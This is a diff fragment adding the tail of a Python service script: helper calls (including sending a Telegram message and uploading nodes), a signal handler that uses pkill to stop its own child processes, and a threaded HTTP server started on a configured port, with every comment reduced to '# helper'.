+    # helper
+    extract_domains()
+
+    # helper
+    send_telegram()
+    upload_nodes()
+    add_visit_task()
+
+    # helper
+    clean_files()
+
+# helper
+def stop_all(signum=None, frame=None):
+    """helper"""
+    def shutdown():
+        log('\nShutting down...')
+        try:
+            exec_cmd(f'pkill -f "{web_name}" > /dev/null 2>&1')
+            exec_cmd(f'pkill -f "{bot_name}" > /dev/null 2>&1')
+            if MON_PORT:
+                exec_cmd(f'pkill -f "{npm_name}" > /dev/null 2>&1')
+            elif MON_ADDR and MON_KEY:
+                exec_cmd(f'pkill -f "{php_name}" > /dev/null 2>&1')
+        except Exception:
+            pass
+        time.sleep(1)
+        os._exit(0)
+
+    t = threading.Thread(target=shutdown, daemon=True)
+    t.start()
+
+# helper
+if __name__ == '__main__':
+    signal.signal(signal.SIGINT, stop_all)
+    signal.signal(signal.SIGTERM, stop_all)
+
+    # helper
+    server = ThreadingHTTPServer(('0.0.0.0', PORT), RequestHandler)
+
+    always_log(f'server is running on {PORT}!')
+
+    # helper
+    t = threading.Thread(target=start_server, daemon=True)
+    t.start()
+
+    # helper
+    server.serve_forever()
